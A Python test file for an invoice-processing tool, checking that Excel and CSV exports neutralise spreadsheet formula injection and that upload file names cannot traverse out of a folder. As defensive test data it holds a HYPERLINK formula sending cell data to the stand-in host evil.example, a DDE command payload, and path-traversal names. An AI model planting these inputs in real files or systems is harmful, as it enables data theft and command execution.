"""Untrusted text is made safe for spreadsheets and file names."""

import io
import json

from openpyxl import load_workbook

from ap_coder.core.safe import csv_cell, parse_amount
from ap_coder.erp import exports
from ap_coder.erp.statements import Line, Reconciliation, to_csv
from tests.conftest import SAMPLE_STEM, SAMPLES

EVIL = '=HYPERLINK("http://evil.example/?d="&A2,"Click")'


def _invoice():
    gt = json.loads((SAMPLES / "ground_truth" / f"{SAMPLE_STEM}.json").read_text())
    gt["vendor_name"] = EVIL
    gt["line_items"][0]["description"] = "+cmd|' /C calc'!A0"
    gt["gl_distribution"] = [
        {"kind": "expense", "line_number": 1, "gl_code": "6010", "cost_center": "", "net_amount": -10.0,
         "non_recoverable_tax": 0.0, "amount": -10.0, "description": "@SUM(1+1)"},
    ]  # fmt: skip
    return {"id": 1, "final_output": gt, "reviewer": "Jane", "reviewed_at": "2026-10-01T10:00:00", "file_name": "a.pdf"}


def test_excel_export_has_no_formulas():
    data, _, _ = exports.build("xlsx", [_invoice()], {}, 1)
    wb = load_workbook(io.BytesIO(data))
    cells = [c for ws in wb.worksheets for row in ws.iter_rows() for c in row]
    assert not [c.coordinate for c in cells if c.data_type == "f"]
    assert any(c.value == EVIL for c in cells)  # the text itself is kept
    assert any(c.value == -10 and c.data_type == "n" for c in cells)  # negative amounts stay numbers


def test_csv_downloads_neutralise_formulas_but_keep_numbers():
    # the ERP CSV is for a loader, not Excel: its text stays exactly as it is (E2-2)
    text = exports.build("csv", [_invoice()], {}, 1)[0].decode("utf-8-sig")
    assert "'=HYPERLINK" not in text and ",@SUM(1+1)," in text and ",-10.00," in text
    rec = Reconciliation([Line("not_received", "=1+2", "2026-09-01", -5.0, note="-Payment")])
    out = to_csv(rec).decode("utf-8-sig")
    assert "'=1+2" in out and "-5.00" in out and "'-Payment" in out
    assert csv_cell("-12.50") == "-12.50" and csv_cell(-3) == -3 and csv_cell("plain") == "plain"


def test_upload_names_cannot_leave_the_folder():
    from ap_coder.web.pages.process import safe_file_name

    assert safe_file_name("../../../../etc/cron.d/x.pdf") == "x.pdf"
    assert safe_file_name("/etc/x.pdf") == "x.pdf"
    assert safe_file_name("C:\\Windows\\System32\\x.pdf") == "x.pdf"
    assert safe_file_name("..") == "invoice" and safe_file_name("") == "invoice"
    assert safe_file_name(".hidden.pdf") == "hidden.pdf"
    assert safe_file_name("Facture été 2026.pdf") == "Facture été 2026.pdf"


def test_parse_amount_reads_thousands_only_from_real_thousands_groups():
    """A separator is a thousands one only when the groups are real thousands (1-3 digits, not 0, then threes)."""
    assert parse_amount("0,125") == 0.125 and parse_amount("-0,500") == -0.5 and parse_amount("1,2345") == 1.2345
    assert parse_amount("12.50.00") is None and parse_amount("01.02.2026") is None
    assert (
        parse_amount("1,234") == 1234 and parse_amount("1,234,567") == 1234567 and parse_amount("1.234.567") == 1234567
    )
    assert (
        parse_amount("150,00") == 150 and parse_amount("1 234,56 $") == 1234.56 and parse_amount("1,234.50") == 1234.5
    )
    assert parse_amount("1.234,50") == 1234.5 and parse_amount("(150.00)") == -150 and parse_amount("1.5") == 1.5
    assert parse_amount("12,34.50") is None
